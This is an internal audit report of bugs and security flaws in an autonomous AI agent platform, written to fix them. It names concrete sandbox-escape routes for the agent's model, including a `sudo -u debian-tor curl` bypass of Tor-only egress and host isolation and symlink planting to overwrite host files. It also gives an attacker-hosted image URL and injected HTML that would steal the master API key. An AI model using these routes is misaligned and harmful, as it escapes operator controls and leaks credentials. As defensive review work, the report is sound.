# Agent-wide bug & improvement search — 2026-09-17

Method: ten parallel read-only reviewers, one per subsystem (turn loop ×2, LLM client/router,
core tools, web tools, sandbox boundary, API/process, memory substrate, verifier/learning
stack, interface/scripts), each required to trace callers/callees and execute repros in the
scratchpad. The parent then independently re-verified every CRITICAL and most MAJORs by
reading the cited code or re-executing the repro against the real module (marked below).
Mechanical scans (lint gate, f-string SQL, unheld create_task, blocking calls in async)
came back clean. No project file was modified. The live sandbox container was probed
read-only for S1 (host-only traffic; no clearnet request was made).

Verification tags: **[P-exec]** parent re-executed the repro · **[P-read]** parent confirmed by
reading the code · **[R-exec]** reviewer executed, parent did not repeat · **[plausible]** traced,
not executed.

---

## CRITICAL

### S1. Tor-only egress is bypassable from inside the sandbox via `sudo -u debian-tor` [P-exec, LIVE]
`sandbox/tor_egress.py:81,89` exempt uid `debian-tor` from the nat REDIRECT and the filter REJECT
(needed so Tor's own traffic is not looped). `sandbox/docker.py:1128` writes `ALL ALL=(ALL)
NOPASSWD: ALL` into sudoers; `docker.py:1836` runs every model command as root on macOS; the
`GHOST_SANDBOX_DROP_CAPS` hardening is OFF by default so CAP_SETUID is present. Live probe on
`ghost-agent-sandbox-ecf4109f`: as root `host.docker.internal` does not even resolve (DNS goes
through Tor); as `sudo -n -u debian-tor curl http://host.docker.internal:8000/api/health` → HTTP
403 from the agent's own auth. The same rule exempts clearnet: a model-authored `sudo -u debian-tor
curl https://…` leaves with the real IP. Both hard constraints (Tor-only, no host reach) fall to one
word, `_egress_state` still says "enforced", and `LEAK_PROBES` never tries a uid switch.
Fix: do not exempt a uid the model can become — run Tor in a sidecar netns, or drop SETUID/SETGID +
`no-new-privileges` on the sandbox (and move apt installs to image build), or run model execs as a
non-root uid on macOS too. Add `sudo -u debian-tor curl` to `LEAK_PROBES` and the live check.

### M1. Research briefs / main-loop findings / INDEX.md are written with symlink-following `write_text` [P-read]
`core/project_research.py:706, :495-497, :272, :106-116`. Slug is deterministic from the topic; the
container can plant `research/<slug>.md` (or the fixed `main-loop-findings.md.tmp`) as a symlink to
any host file, and the next autoadvance/main-loop tick writes model text onto it. `ensure_workspace`
also `mkdir(parents=True)`s through a symlinked `projects/<id>` with no `_contained_workspace`
check. The same class was fixed for PROJECT_MAP.md/RELEASE.md in `memory/projects.py`; this module
imports only the nofollow *readers*. Fix: `_contained_workspace` before any mkdir; `write_text_nofollow`
(+pid-unique tmp) for every write.

### I1. Agent-authored HTML reaches the UNSANDBOXED render iframe same-origin → master key theft [P-read]
`interface/static/app.js:4826` decides "this is a PDF" with `/\.pdf(\?|$)/i` on the RAW href, so
`[report](/api/download/evil.html?v=.pdf)` passes; the loader `fetch()`es it, wraps the `text/html`
blob in a blob: URL and sets it as `#render-iframe` src (the frame `index.html:113` deliberately
has no `sandbox` attribute). Blob URLs inherit the page origin → agent/injected-page script reads
`GHOST_API_KEY`, localStorage, cookies. Fix: test `new URL(href).pathname`, and refuse unless the
response `Content-Type` is `application/pdf` (or re-type the blob).

### I2. Auth wrapper attaches `X-Ghost-Key` to cross-origin requests [P-read]
`interface/static/app.js:45`: `isApi = url.startsWith('/api/') || url.includes(location.host + '/api/')`.
An `<img src="https://attacker/api/download/p.png?r=<host>:8080/api/">` in an agent reply (DOMPurify
keeps https img) makes `_handleChatImage` fetch it with the master key; the attacker's CORS preflight
accepts the header. Fix: same-origin check via `new URL(url, location.href).origin === location.origin`.

### I3. Two scripts `rm -rf` the LIVE data dir by default [P-read]
`scripts/run_eval_loop.sh:21-36` (RESET defaults true; `--no-reset` is opt-OUT) and
`scripts/run_selfhood_functional.sh:79-87,103,128` (`wipe_all` unconditional) delete the hard-coded
production `sandbox/`, `system/memory`, `system/selfhood`, `system/trajectories` and kill the
launchd-supervised agent, with no backup. Fix: require `--wipe-live`, honour `$GHOST_HOME`, refuse
when it resolves to the production path (the `reembed_memory.py` pattern).

---

## MAJOR — data loss / silent wrong results

**Core tools (file_system / execute)**
- **V1** `tools/execute.py:1136` (+:1103, :1148). The file-not-found heal re-runs the command at the
  sandbox ROOT; `_rerun_unsafe` only inspects `segments[:-1]`, so a single-segment `rm -r build` /
  `mv` / `sed -i` / `unzip` is "safe" and deletes/moves the root's copy, reported EXIT 0. [P-read]
- **V2** `tools/file_system.py:4690`. `_released_write_block` uses `.search()` on
  `f"{sandbox_dir}/{target}"` → the FIRST project id (the scoped ACTIVE dir) is looked up, never the
  RELEASED target. Reproduced: released `index.html` overwritten from project A. [P-exec]
- **V3** `tools/file_system.py:3639`. `replace` commits with in-place `path.write_text`; ENOSPC/EFBIG
  mid-write leaves a half file and returns a plain "Error" str with `world_changed=None`.
  `tool_write_file` already does mkstemp+`os.replace`. [P-read]
- **V4** `tools/file_system.py:4495` (rename :4486). `delete`/`rename` on an in-sandbox symlink act on
  the RESOLVED target: `real/` rmtree'd, `alias` left dangling. Reproduced. [P-exec]
- **V5** `tools/execute.py:1600` (+:1661). `.jupyter_runner.py` / `._<name>` written with plain
  `write_text` (follows a planted symlink → overwrites e.g. `main.py`, then the `finally` unlinks it);
  the `_get_safe_path` raise sits outside every try → raw exception instead of `_format_error`. [P-read]
- **S3** `tools/execute.py:1654`. Script staging `write_text` after a non-atomic containment check;
  `write_text_nofollow_in_dir` exists and is not used; `tools/execute.py` is not in the
  `_MODEL_WRITABLE_MODULES` enumeration. [plausible]

**Memory / projects**
- **M2** `memory/projects.py:607-623`. Hard `delete_project` rmtree's `Path(ws).resolve()`; a
  symlinked workspace inside the root passes containment and deletes a SIBLING project's tree. [P-read]
- **M3** `memory/projects.py:1028-1074`. `_maybe_rollup_project_status` reads tasks, releases the lock,
  then UPDATEs guarded on project status only → a task added in the window is buried under DONE and
  the cleanup sweep fires on a project with open work. [P-read]
- **M4** `core/project_advancer.py:916-936`. A coding-executor crash returns "blocked" with the leaf
  still IN_PROGRESS; nothing resets it until the boot reaper (`main.py:1601`), and `advance_many`
  reports `project_done`. The `:1053` sibling correctly sets PENDING. [P-read]

**Turn loop / reply post-processing (all silently alter what the user sees)**
- **T1** `core/agent.py:16730-16745`. Native-JSON tool args are `html.unescape`d and `\"`→`"`
  rewritten before dispatch (`--native-tools` is the default): `s = "He said \"hi\" &amp; left"`
  in a file write lands as `s = "He said "hi" & left"` (SyntaxError), HTML samples become live
  markup; the corrupted args also feed the trajectory record. Only XML-harvested values need this. [P-read]
- **T2** `core/agent.py:15798, :22864, :4451`. Mixed native+XML reply: native wins, XML dropped —
  but history keeps the XML block and `_render_assistant_with_tool_calls` skips native rendering when
  `<tool_call>` is already inline, so the next turn shows the DROPPED call (e.g. `rm -rf build/`)
  followed by the real call's `<tool_response>`. [P-read]
- **B1** `core/agent.py:4884/4997`. `_strip_think_blocks` unclosed arm strips to EOF on any prose or
  backtick mention of `<think>`: "…in a <think> block before the answer. The answer is 42." →
  "…in a ". Both delivery paths + durable history. [P-exec]
- **B2** `core/agent.py:19929, :22822`. `--- EXECUTION RESULT ---.*?(24 dashes|$)` — the 24-dash
  terminator only exists on FAILURE blocks, so a quoted successful result deletes the rest of the
  reply. [P-exec]
- **B5** `core/agent.py:4165`. `_BLEED_STRONG` `<tools>` truncates a fenced Maven/Ant XML answer
  mid-fence. [P-exec]
- **B4** `core/agent.py:26160-26190`. With `--visual-nodes` (live), every image in history is
  re-decoded and written to a NEW `vision_<uuid>.jpg` on every loop iteration of every later request
  (sync write on the loop, never cleaned, filename in the prompt changes each turn → busts KV prefix;
  image parts cost 0 tokens in every budget). [R-exec]
- **B3** `core/agent.py:28743…29470`. Mid-stream client disconnect parks the generator at a `yield`;
  Starlette 1.0 never `aclose()`s it → durable tail (episode, trajectory, work_log, calibration,
  verifier, session persist) is skipped until GC, turn stays registered, ReadBudget armed, llama slot
  keeps generating. [plausible]
- **R3** `core/agent.py:22536`. Truncated-answer continuation pops `tools` → foreign prefix on the
  main slot (the §4HC eviction class); the forced-final sibling at :28667 keeps `tools` +
  `tool_choice="none"`. [P-read]

**Web tools**
- **W1** `tools/browser.py:1377`. `blocked_page_reason` only for navigate/extract_text/screenshot;
  `interact`/`click` ship a 403 challenge page as `STATUS: OK`, and the deterministic error route
  steers the model INTO `interact`. [P-read]
- **W2** `tools/browser.py:1526`. `interact` `extract_text` delivers `text[:500]`; the promised "TEXT
  block follows for full fidelity" does not exist (64 KB fetched, 1% used). [P-read]
- **W3** `tools/projects.py:1996`. `constraint_retire` is not in `_TITLE_RESOLVABLE` → `title=beta`
  retires the ACTIVE project's constraints and reports success. [P-read]
- **W5** `tools/projects.py` `_ok`. Only `gated_constraints` refusals map to `rejected`;
  `still_failing` / `constraint_violations` / all-ids-missing ship `status ok` over `updated: []`. [P-read]
- **W6** `task_update` drops `description` (bulk) and `failure_reason` (no status) but lists every id
  as updated. [R-exec]
- **W4** `tools/composed_skills.py:1748`. A macro may call `manage_composed_skills action=run` on
  itself → recursion; side-effect step ran 164×, every level "overall OK". [R-exec]
- **W10** `tools/darkweb_search.py:1169`. Breaker records `bool(res)`; a genuine "no-hits" page is a
  failure → one 4-phrasing search puts torch/torgle in a 15-min cooldown and later searches carry a
  manufactured "engine skipped" warning. [P-read]
- **W7** `tools/projects.py:3513`. `_release_rehearsal` (docker restart + `time.sleep` TCP probes,
  :1517) runs synchronously in the async handler; `_stop_project_services` same shape. [P-read]
- **W8/W9** `tools/acquired_skills.py:1003,844`. Embedding writes on the loop under the vector RLock
  (blocks for a whole document ingest); `create_skill` raises TypeError on dict-typed
  `parameters_schema` (the native call shape). [R-exec]
- **W11** Orphaned Chromium after a `timeout -k` kill holds `SingletonLock`; no reaper → browser
  fails agent-wide until `close`. [plausible]

**API / process**
- **A4** `core/bus.py:1273`. `publish_fact` stamps the dedup LRU BEFORE the write; a retry after a
  failed vector leg is answered "dedup" and the tool says SUCCESS for a fact never stored. [P-read]
- **A5** `core/sessions.py:645-677`. `append_turn` is an unlocked get→extend→write; two concurrent
  appends on one session lose a turn. [P-read]
- **A2** `main.py:3519-3535`. The §4FS boot orphan-twin reconcile reads `context.memory_system`
  in `main()` before `lifespan` creates it (:1640) → always None, never runs, no log. [P-read]
- **A3** `api/routes.py:2057-2274`. `load_workspace` wipes and extracts up to 500 MB synchronously on
  the event loop (the `save_workspace` sibling was moved to a thread). [P-read]
- **A6** `utils/logging.py:596`. The file handler has no redaction filter; every stdlib `logger.*`
  record (user text, URLs, tracebacks) lands unredacted while `pretty_log` twins are redacted. [R-exec]
- **A7** `core/liveness.py:192-217`. `_LOG_CACHE` retains the whole never-rotated log (131 MB
  measured) and re-parses on every `introspect learning`. [R-exec]
- **A1** `main.py:1007`. `arg.notify_webhook` / `arg.default_db` are cleartext in `/api/health`,
  `last_config.json` (0644) and the boot log (env leg of the same value is redacted). Live: webhook
  empty, DB URI has no password → latent. [P-read]

**Sandbox**
- **S2** `sandbox/jobs.py:831`. `_read_log` over-cap branch reads the WHOLE file
  (`_read_bytes_nofollow(path)` with no max) → +2.4 GB RSS at the 1 GB log cap; a model-driven
  host-OOM lever that also trips the RSS watchdog. [R-exec]

**LLM / router**
- **R1** `router/features.py:38`. `_FILE_PATH_RE` (lazy `*?` over a class containing `.`) is
  quadratic and runs on the loop against the untruncated user message: 20 k chars = 1.18 s, 40 k =
  4.9 s (a pasted JWT/base64/hex blob). [P-exec]
- **R2** `core/subagent.py:160,261` + `core/llm.py:3701`. A delegated sub-agent is forced
  `is_background=True`; `stream_chat_completion` parks it behind the parent turn's
  `foreground_requests` while its own 600 s wall clock runs → jobs fail by timeout with zero LLM
  calls on long parent turns. [R-exec]

**Verifier / learning stack**
- **L1** `core/dream.py:2450`. REM consolidation deletes ≤150 fragments/cycle: no kill switch, no
  archive, no cap; `tool_dream_mode` bypasses `--no-dream`.
- **L2** `core/dream.py:3214` / `memory/graph.py:650`. Graph compression deletes/rewrites triplets
  with no archive (sibling `prune_stale_edges` archives).
- **L3** `core/dream.py:1957`. Self-play straggler purge deletes EMPTY dirs the setup script created
  (`snap_dirs` derived from files only) → solver's first `open("output/x")` fails every attempt,
  charged as agent failure. [P-read]
- **L6** `optim/live_check.py:681`. Daily live judge re-tests an accruing corpus at fixed α=0.05 →
  optional stopping: 12.6% false REVERT at 60 looks, 20.6% at 180 (Monte Carlo on the real
  `verdict()`). [R-exec]
- **L7** `reflection/prompts.py:120`. `gepa:reflection.critique` read site passes no req_id →
  never attributed → live judge INSUFFICIENT forever; the only autonomous undo is unreachable.
- **L8** `core/objection.py:1191`. Rule-1 UPHOLD ignores `truncation_severity` → a figure cut by
  the packer is "fabricated", mechanically REFUTED with no model call.
- **L9** `core/evidence_gate.py:138`. `Error:` in the first 200 chars of a SUCCESSFUL `execute`
  (log triage!) marks it "error" → "every retrieval came back empty… do NOT state facts" steer. [P-read]
- **L10** `core/failure_distill.py:373`. Worker outage → memo permanently records "unknown"; never
  re-adjudicated until the text changes.
- **L11/L12** `distill/redact.py:196,257`. `{'Authorization': 'Bearer …'}` (python-repr),
  `authorization=Bearer …`, `X-Api-Key:`, `api-key:`, `Set-Cookie:` values all pass through
  unredacted into trajectories/log mirror. [P-exec]
- **L13** `reflection/postmortem_prompts.py:212`. Section labels matched anywhere (colon optional):
  "…had no lesson about verifying paths…" → lesson = "about verifying paths, so it re-read…" →
  persisted to the playbook. [P-exec]
- **L14** `core/agent.py:27286-27293`. The §4ER "bottom quintile" label-ask is `lows[20//5-1]` of a
  20-row fetch = 4th-lowest of the whole window: 2% ask rate live (true quintile cutoff 0.654 vs
  0.491 used). [P-read]
- **L15** `core/replay_engine.py:774`. `"compile(" in low` rejects `re.compile` / `ast.literal_eval`
  validators → episode re-planned nightly, never credited. [P-exec]
- **L16** `core/replay_engine.py:1986,2053,1933`. Replay batch walks the whole corpus twice and
  pings docker per trajectory, all synchronously on the loop, for up to an hour.
- **L17** `core/agent.py:27459`. §4FZ stand-down returns None → `execution_failed=True` → FAILED
  via the outcome ladder → Reflector learns from an honest-inability turn. [plausible]

---

## MINOR (selected; full list in reviewer notes)
- V6 streaming replace drops file mode; V7 SEARCH/REPLACE exact rung edits the first of N identical
  matches silently; V8 `download` leaves a partial file; V9 `file_system` search/find never lazily
  re-init the sandbox manager.
- M5 embedder sidecar written non-atomically → torn write = FATAL boot loop; M6 selfhood
  state/values fail open on OSError and the next flush overwrites the intact file.
- B6 `task_N`/`PLAN:` line-prefix scrubs mangle content (`task_1.py handles…` → `.py handles…`)
  [P-exec]; B7 finalize dedup ignores fences; B8 forced-final retry strips only closed think;
  B10 unfenced `<tool>` XML scrubbed and mislabelled as a failed tool call.
- T3 bare-tag harvester pollutes args from HTML bodies; T4 planner locals (`required_tool`) survive
  a planner exception on the next turn; T5 strike-cap `break` leaves calls with no `<tool_response>`;
  T6/L25 System-3 hypothesis executor bypasses every execute guard (latent: `--deep-reason` off);
  T7 imagine preflight keyed on the wrong request id.
- W12 failed mid-sequence goto poisons `.last_url` with `chrome-error://`; W13 interact goto defaults
  to `load` over Tor; W14 page WebSockets bypass the route interceptor to loopback; W15
  `update_profile value=0` takes the DELETE path; W16 scratchpad set with no value stores None;
  W17 darkweb_search is the one curl_cffi site without `resolve_egress_proxy` (`TOR_PROXY=""` +
  `--no-mandatory-tor` = direct fetch); W18 list-typed `query` TypeError; W19 empty artifact_add;
  W20 delegated workspaces never reaped; W21 composed-skill save races register.
- A8 shutdown drain gathers infinite loops → always burns 5 s then cancels finite writes; A9 chess
  history replay unbounded on the loop; A10 one bad line marks the evolve ledger unreadable; A11
  proxied stream leaves upstream open on disconnect; A12 concurrent same-session requests build from
  pre-turn history; A13 offsets use a fixed `.tmp`; A14 redirect targets never re-validated for SSRF;
  A15 upload with nested filename / download of a dir → 500; A17 idle heartbeat only from
  `router_train` → false DEAD for five phases.
- S4 job reaper kills by pid+generation only; S6 `reap()` docker exec per command.
- R4 tokenizer `len//4` fallback under-counts code 1.8× / CJK 3.1× and becomes permanent when the
  local tokenizer is missing under mandatory-tor; R5 tokenizer network fallback fetches HF directly
  (blocked live by `HF_HUB_OFFLINE`).
- L18 forged `# --- file this turn wrote:` header in a COMMAND survives into the judge's CODE slot;
  L19 objection rule-2 upholds "1,500,000" vs "1.5 million"; L20 800-replicate AUC bootstrap on the
  loop per turn (0.195 s); L21 `looks_like_tool_error` fires on a source file mentioning "exception"
  over a declared-OK status [P-exec]; L22 verifier `_parse_json` returns an inner object; L23
  escalation ledger rides shared verifier state; L24 journal-mining denylist misses
  `find -delete`/`rmtree`/`sed -i`; L26 `-u user:pass`, `--token X`, `-pPASS`, Slack webhook URLs
  unredacted + quadratic email regex (0.88 s on a 32 k blob, on the loop); L27 `bench_floor(10,0.02)`
  = 0.0 [P-exec]; L28 sync I/O under locks in dream; stage-1 scratch dirs never removed; L29 replay
  `applied=False` conflation; L30 hypothesis/MCTS crash on list replies; L31 learning-health twin
  skips the pressure migration.
- L34 `core/verifier.py:3004` refute "escalation" decides the cheap route from client ATTRIBUTES, not
  the route that actually served; when critic+worker both fail and MAIN served the cheap verdict, the
  main model re-asks itself under the credulous classic prompt (84% overturn live) [plausible];
  `_last_main_call` is shared instance state across concurrent verifications.
- L35 `memory/graph.py:503-521` `prune_stale_edges` has no per-cycle bound (archived, so recoverable).
- L36 `core/experiments.py:2820` verdict-announce marker rewritten non-atomically → a torn file
  re-pushes every DECIDED verdict at notify severity after restart.
- L37 `core/dream.py:3823` `_verify_lesson_helpful` restore is top-level only while snapshot/purge
  are recursive → verify solver sees attempt-N residue, unearned `verified=True`.
- L38 `distill/redact.py:475` master-key rule re-reads the key file per string leaf when
  `GHOST_API_KEY` is unset (bench/scripts).
- I4 `sync_youtube_transcribe_macro.py` rewrites the live store with no running-agent check; I5
  proxy collapses repeated query params.

## IMPROVEMENTS (high value)
1. **Kill switch + archive + per-cycle cap for every destructive autonomous op**: REM fragment
   delete (L1), graph compression (L2), skills_auto deprecate (L32), workspace sweeps
   (`sweep_project_workspace` / `tidy_project_workspace` read no env at all, S5). One
   `GHOST_<X>=0|dry` gate each, archive-before-delete that fails CLOSED.
2. **Per-turn hot-path cost**: playbook JSON parsed ≥3× and fsync-rewritten every prompt build
   (M8); whole-history re-tokenisation 4-6× per turn, up to 64 passes in `_cap_oversized_tail`
   (T8); AUC bootstrap per finalize (L20); `reap()` exec per command (S6). Memoise per message
   object / cache by (mtime,size).
3. **One-path fixes shipping half** recur across the tree: atomic write (V3 vs `tool_write_file`),
   nofollow writes (M1/V5/S3 vs `projects.py`), `to_thread` (A3 vs `save_workspace`; W7 vs
   `sandbox_services.py`), `tools` kept on retry (R3 vs forced-final), rejected-outcome mapping
   (W5), reaper identity (S4). Worth an AST enumeration per class, per §R1.
4. `_prune_context` condense prompt is unbounded and never consults the worker's probed `n_ctx`
   (B9); `stream_chat_completion(is_background=True)` ignores `targets_main_node` (R6).
5. Dead code to delete: `memory/projects.py:_write_metadata` (M7), `_GhostLMAdapter` (L33).

## Reviewer blind spots (not covered)
Live network paths (download over Tor, vision URL fetch), Postgres tool, `fs_batch` treatment arm,
the browser runner under a live container (W11 not executed), dream.py's self-play body beyond the
isolation block, `_handle_trivial_chat`, `_biological_tick`, prompts.py bodies, clockwork/CLI
externals bodies, `dspy` internals.
